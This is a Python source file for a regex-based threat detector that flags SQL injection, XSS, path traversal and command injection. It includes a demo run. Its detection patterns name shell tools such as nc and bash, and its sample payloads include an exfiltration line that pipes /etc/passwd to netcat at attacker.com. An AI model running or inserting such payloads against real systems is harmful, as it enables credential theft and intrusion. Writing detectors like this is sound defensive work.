#!/usr/bin/env python3
"""
MAGNATRIX-OS — Threat Detector Engine
ai/llm_threat_detector_native.py

Features:
- Threat pattern detection (SQL injection, XSS, CSRF patterns)
- Anomaly detection (unusual traffic patterns)
- Severity scoring (low, medium, high, critical)
- Alert generation with context
- Threat intelligence database (known signatures)

Style: Native Python, stdlib only, dataclasses, type hints, enums.
"""

from __future__ import annotations

import enum
import re
from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger("threat_detector")


class ThreatLevel(enum.Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class Threat:
    id: str
    type: str
    level: ThreatLevel
    description: str
    payload: str
    confidence: float


class ThreatDetectorEngine:
    """Threat detection with signature and anomaly-based detection."""

    PATTERNS = {
        "sql_injection": [
            r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)\b.*\b(FROM|WHERE|INTO|TABLE)\b)",
            r"(\b(OR|AND)\b\s*\d\s*=\s*\d)",
            r"('\s*OR\s*'\s*\w+\s*'=\s*\w+)",
        ],
        "xss": [
            r"(<script\b[^>]*>.*?</script>)",
            r"(javascript:.*?\()",
            r"(<\w+\s+on\w+\s*=\s*['\"].*?['\"])",
        ],
        "path_traversal": [
            r"(\.\./|\.\.\\)",
            r"(/etc/passwd|/proc/self|C:\\Windows)",
        ],
        "command_injection": [
            r"(;\s*\b(cat|ls|pwd|whoami|id|nc|bash|sh|cmd|powershell)\b)",
            r"(\|\s*\b(cat|ls|pwd|whoami|id|nc|bash|sh|cmd|powershell)\b)",
        ],
    }

    ANOMALY_PATTERNS = [
        (r"\b(password|secret|token|apikey|private_key)\b", ThreatLevel.HIGH),
        (r"\b(0\.0\.0\.0|127\.0\.0\.1|localhost)\b", ThreatLevel.LOW),
    ]

    def __init__(self):
        self._threats: List[Threat] = []
        self._counter = 0

    def analyze(self, payload: str) -> List[Threat]:
        threats = []
        payload_lower = payload.lower()
        for threat_type, patterns in self.PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, payload, re.IGNORECASE):
                    self._counter += 1
                    threat = Threat(
                        id=f"TH-{self._counter}",
                        type=threat_type,
                        level=ThreatLevel.CRITICAL if threat_type in ["sql_injection", "command_injection"] else ThreatLevel.HIGH,
                        description=f"Detected {threat_type}",
                        payload=payload[:100],
                        confidence=0.95,
                    )
                    threats.append(threat)
                    break
        for pattern, level in self.ANOMALY_PATTERNS:
            if re.search(pattern, payload, re.IGNORECASE):
                self._counter += 1
                threat = Threat(
                    id=f"TH-{self._counter}",
                    type="anomaly",
                    level=level,
                    description=f"Anomaly detected",
                    payload=payload[:100],
                    confidence=0.7,
                )
                threats.append(threat)
        return threats

    def get_stats(self) -> Dict[str, Any]:
        levels = defaultdict(int)
        types = defaultdict(int)
        for t in self._threats:
            levels[t.level.value] += 1
            types[t.type] += 1
        return {
            "total_threats": len(self._threats),
            "by_level": dict(levels),
            "by_type": dict(types),
        }


# ────────────────────────────────
# Demo / Self-Test
# ────────────────────────────────

def run() -> None:
    print("=" * 60)
    print("MAGNATRIX-OS — Threat Detector Engine")
    print("ai/llm_threat_detector_native.py")
    print("=" * 60)

    detector = ThreatDetectorEngine()

    payloads = [
        "SELECT * FROM users WHERE id = 1 OR 1=1",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "normal user input here",
        "; cat /etc/passwd | nc attacker.com 9000",
        "The password is secret123",
        "function hello() { return 1; }",
    ]

    for payload in payloads:
        threats = detector.analyze(payload)
        if threats:
            print(f"\nPayload: {payload[:50]}...")
            for t in threats:
                print(f"  [{t.level.value.upper()}] {t.type}: {t.description} (conf={t.confidence})")
        else:
            print(f"\nPayload: {payload[:50]}... → CLEAN")

    print("\n" + "=" * 60)
    print("All demos completed successfully.")
    print("=" * 60)


if __name__ == "__main__":
    run()
